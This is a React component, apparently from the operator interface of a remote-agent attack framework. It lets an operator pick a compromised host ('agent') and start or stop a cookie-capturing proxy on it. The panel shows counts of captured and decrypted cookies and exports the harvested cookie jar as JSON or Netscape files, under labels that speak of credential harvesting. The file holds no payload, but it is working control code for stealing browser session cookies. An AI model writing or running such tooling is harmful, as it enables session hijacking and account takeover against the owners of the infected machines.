"use client";

import { useCallback, useEffect, useState } from "react";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { downloadText } from "@/lib/download";
import { useI18n } from "@/lib/i18n";
import { toast } from "sonner";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Banner } from "@/components/ui/banner";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { fetchAgentListCached } from "@/lib/agents";

interface ProxyStatus {
  running?: boolean;
  port?: number;
  cookies?: number;
  decrypted?: number;
  host?: string;
}

export function CookieProxyCard() {
  const { t } = useI18n();
  const [agents, setAgents] = useState<Array<{ id: string; hostname: string; status?: string }>>([]);
  const [agentId, setAgentId] = useState("");
  const [status, setStatus] = useState<ProxyStatus | null>(null);
  const [busy, setBusy] = useState(false);

  const loadAgents = useCallback(async () => {
    const list = (await fetchAgentListCached()).map((a) => ({
      id: String(a.id || ""),
      hostname: String(a.hostname || a.id || ""),
      status: a.status,
    })).filter((a) => a.id);
    setAgents(list);
    setAgentId((prev) => prev || list.find((a) => a.status === "online")?.id || list[0]?.id || "");
  }, []);

  const refresh = useCallback(async (id: string) => {
    if (!id) return;
    try {
      const res = await api.get<ProxyStatus>(paths.agents.cookieProxy(id));
      setStatus(res as ProxyStatus);
    } catch {
      setStatus(null);
    }
  }, []);

  useEffect(() => { void loadAgents(); }, [loadAgents]);
  useEffect(() => { void refresh(agentId); }, [agentId, refresh]);

  const start = async () => {
    if (!agentId) return;
    setBusy(true);
    try {
      await api.post(paths.agents.cookieProxyStart(agentId), {});
      toast.success(t("cred.cookie_proxy_started"));
      await refresh(agentId);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : t("cred.cookie_proxy_failed"));
    } finally {
      setBusy(false);
    }
  };

  const stop = async () => {
    if (!agentId) return;
    setBusy(true);
    try {
      await api.post(paths.agents.cookieProxyStop(agentId), {});
      await refresh(agentId);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : t("cred.cookie_proxy_failed"));
    } finally {
      setBusy(false);
    }
  };

  const downloadJar = async () => {
    if (!agentId) return;
    try {
      const res = await api.get<{ cookies?: unknown }>(paths.agents.cookieProxyJar(agentId));
      downloadText(JSON.stringify(res.cookies ?? res, null, 2), `cookies-${agentId}.json`, "application/json");
    } catch (err) {
      toast.error(err instanceof Error ? err.message : t("cred.cookie_proxy_failed"));
    }
  };

  const downloadNetscape = async () => {
    if (!agentId) return;
    try {
      const { blob } = await api.downloadGet(paths.agents.cookieProxyNetscape(agentId), `cookies-${agentId}.txt`);
      const text = await blob.text();
      downloadText(text, `cookies-${agentId}.txt`);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : t("cred.cookie_proxy_failed"));
    }
  };

  return (
    <Card className="p-(--card-spacing)">
      <div className="mb-3">
        <div className="text-sm font-semibold">{t("cred.cookie_proxy_title")}</div>
        <p className="text-xs text-muted-foreground mt-0.5">{t("cred.cookie_proxy_hint")}</p>
      </div>
      <div className="flex flex-wrap items-end gap-3">
        <div className="min-w-[200px]">
          <span className="mb-1.5 block text-xs font-semibold text-muted-foreground">{t("cred.harvest_agent")}</span>
          <Select value={agentId} onValueChange={(v) => v != null && setAgentId(v)}>
            <SelectTrigger className="w-full">
              <SelectValue placeholder={t("cred.harvest_need_agent")} />
            </SelectTrigger>
            <SelectContent>
              {agents.map((a) => (
                <SelectItem key={a.id} value={a.id}>{a.hostname} ({a.status || "?"})</SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
        <div className="flex flex-wrap gap-2">
          <Button type="button" size="sm" disabled={!agentId || busy} onClick={() => { void start(); }}>
            {t("cred.cookie_proxy_start")}
          </Button>
          <Button type="button" size="sm" variant="outline" disabled={!agentId || busy} onClick={() => { void stop(); }}>
            {t("cred.cookie_proxy_stop")}
          </Button>
          <Button type="button" size="sm" variant="outline" disabled={!agentId} onClick={() => { void downloadJar(); }}>
            {t("cred.cookie_proxy_json")}
          </Button>
          <Button type="button" size="sm" variant="outline" disabled={!agentId} onClick={() => { void downloadNetscape(); }}>
            {t("cred.cookie_proxy_netscape")}
          </Button>
        </div>
      </div>
      {status?.running && (
        <Banner tone="info" className="mt-3">
          {t("cred.cookie_proxy_listen", { host: status.host || "127.0.0.1", port: String(status.port || 0) })}
          {" · "}
          {t("cred.cookie_proxy_count", { n: String(status.cookies || 0), d: String(status.decrypted || 0) })}
        </Banner>
      )}
    </Card>
  );
}
